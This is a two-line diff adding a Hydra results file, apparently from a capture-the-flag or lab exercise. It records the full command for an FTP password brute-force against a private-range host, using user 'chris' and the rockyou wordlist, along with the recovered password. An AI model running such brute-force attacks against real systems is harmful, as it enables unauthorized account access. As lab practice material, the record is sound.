@@ -1,0 +1,2 @@
+# Hydra v9.4 run at 2022-12-03 03:13:35 on 10.10.209.165 ftp (hydra -l chris -P /usr/share/wordlists/rockyou.txt.gz -f -o hydraresult.txt -t 64 -I ftp://10.10.209.165)
+[21][ftp] host: 10.10.209.165   login: chris   password: crystal
